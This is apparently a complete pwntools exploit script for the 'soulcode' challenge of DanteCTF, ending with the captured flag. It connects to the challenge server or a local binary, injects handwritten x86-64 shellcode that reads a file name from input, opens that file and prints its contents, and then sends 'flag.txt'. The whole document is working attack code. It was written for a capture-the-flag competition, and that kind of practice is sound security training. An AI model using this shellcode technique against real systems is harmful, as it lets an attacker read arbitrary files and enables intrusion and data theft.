#!/usr/bin/python3

from pwn import *

exe = ELF('soulcode', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*0x0000000000401649
                b*main+242
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('challs.dantectf.it', 31532)
else:
    p = process(exe.path)

'''
'''
shellcode = asm(
    '''
    mov rdi, 0
    mov rax, 0x0
    mov rsi, 0x404140
    mov rdx, 21
    syscall
    
    mov rax, 2
    mov rdi, 0x404140
    mov rsi, 0
    mov rdx, 0
    syscall
    
    mov rdi, rax
    mov rax, 0
    mov rsi, 0x404140
    mov rdx, 0x100
    syscall
    
    mov rax, 0x1
    mov rdi, 1
    mov rsi, 0x404140
    mov rdx, 0x100
    syscall
    ''',)
GDB()
sla(b"!\n", shellcode)
sleep(5)
s(b"flag.txt")
p.interactive()
# DANTE{P4nT4_rh31}